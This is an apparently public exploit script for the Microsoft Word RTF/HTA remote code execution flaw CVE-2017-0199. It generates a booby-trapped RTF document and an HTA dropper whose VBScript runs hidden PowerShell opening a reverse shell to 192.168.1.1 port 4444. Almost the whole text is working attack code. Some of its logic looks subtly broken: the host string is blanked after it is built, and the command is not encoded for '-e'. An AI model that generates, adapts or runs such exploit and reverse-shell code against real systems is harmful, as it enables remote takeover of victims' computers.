# Exploit Author: Juan Sacco at KPN Red Team
# Developed using Exploit Pack -  http://www.exploitpack.com  <jsacco@exploitpack.com>
#
# Description: Microsoft Word (CVE-2017-0199) is prone to a RCE trough a HTA Handler 
# A remote code execution vulnerability exists in the way that Microsoft Office and WordPad parse specially crafted files. 
# An attacker who successfully exploited this vulnerability could take control of an affected system.
#
# Impact: An attacker could exploit this vulnerability to execute arbitrary commands in the
# context of the application. Failed exploit attempts could result in a
# denial-of-service condition.
#
# Vendor homepage: http://www.microsoft.com
# 
# Credits: @ShadowBrokerss @EquationGroup @Petya @juansacco

import binascii
def chunk_str(str, chunk_size):
 return [str[i:i+chunk_size] for i in range(0, len(str), chunk_size)]
hta_host="" # 127.0.0.1
for i in chunk_str(binascii.hexlify(b'http://127.0.0.1'),2):
    hta_host+= str(i+"00")
hta_host="" # 127.0.0.1
hta_object = "01000002090000000100000000000000"
hta_object += "0000000000000000a4000000e0c9ea79"
hta_object += "f9bace118c8200aa004ba90b8c000000"
hta_object += hta_host
hta_object += "00000000795881f43b1d7f48af2c825d"
hta_object += "c485276300000000a5ab0000ffffffff"
hta_object += "0609020000000000c000000000000046"
hta_object += "00000000ffffffff0000000000000000"
hta_object += "906660a637b5d2010000000000000000"
hta_object += "00000000000000000000000000000000"
hta_object += "100203000d0000000000000000000000"
hta_object += "0"*480
rtf_template = "{\\rtf1\\adeflang1025\\ansi\\ansicpg1252\\uc1\\adeff31507\\deff0\\stshfdbch31505\\stshfloch31506\\stshfhich31506\\stshfbi31507\\deflang1033\\deflangfe2052\\themelang1033\\themelangfe2052\\themelangcs0\r\n{\\info\r\n{\\author Microsoft}\r\n{\\operator Microsoft}\r\n}\r\n{\\*\\xmlnstbl {\\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}\r\n{\r\n{\\object\\objautlink\\objupdate\\rsltpict\\objw291\\objh230\\objscalex99\\objscaley101\r\n{\\*\\objclass Word.Document.8}\r\n{\\*\\objdata 0105000002000000\r\n090000004f4c45324c696e6b000000000000000000000a0000\r\nd0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nfffffffffffffffffdfffffffefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff020000000003000000000000c000000000000046000000000000000000000000704d\r\n6ca637b5d20103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000200ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000\r\n000000000000000000000000f00000000000000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff0000000000000000000000000000000000000000000000000000\r\n0000000000000000000004000000060000000000000003004c0069006e006b0049006e0066006f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014000200ffffffffffffffffffffffff000000000000000000000000000000000000000000000000\r\n00000000000000000000000005000000b700000000000000010000000200000003000000fefffffffeffffff0600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\n"
rtf_template += hta_object
rtf_template += "0105000000000000}\r\n{\\result {\\rtlch\\fcs1 \\af31507 \\ltrch\\fcs0 \\insrsid1979324 }}}}\r\n{\\*\\datastore }\r\n}\r\n"
print("[*] Microsoft Word RCE - HTA Handler by Juan Sacco")
file_rtf = open("exploitpack.rtf","w") 
file_rtf.write(rtf_template) 
file_rtf.close() 
print("[*] RTF File created")
print(rtf_template)
# Extra bonus PS Reverse one-liner
ps_reverse_shell = "$sm=(New-Object Net.Sockets.TCPClient(\"192.168.1.1\",4444)).GetStream();[byte[]]$bt=0..255|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}\r\n" # Reverse to 192.168.1.1 4444
hta_template = "<script language=\"VBScript\">\r\nSet pwnShell = CreateObject(\"Wscript.Shell\") \r\nSet fsObject = CreateObject(\"Scripting.FileSystemObject\")\r\nIf fsObject.FileExists(pwnShell.ExpandEnvironmentStrings(\"%PSModulePath%\") + \"..\\powershell.exe\") Then\r\n    pwnShell.Run \"powershell.exe -nop -w hidden -e " 
hta_template += ps_reverse_shell
hta_template += "\",0\r\nEnd If\r\nwindow.close()\r\n</script>\r\n"
file_hta = open("exploitpack.hta","w")
file_hta.write(hta_template)
file_hta.close()
print("[*] HTA File created")
print(hta_template)
print("[*] Thanks NSA!")
print("[*] Creditz: @EquationGroup @ShadowBrokers @juansacco")
print("[*] KPN Red team: <juan.sacco@kpn.com>")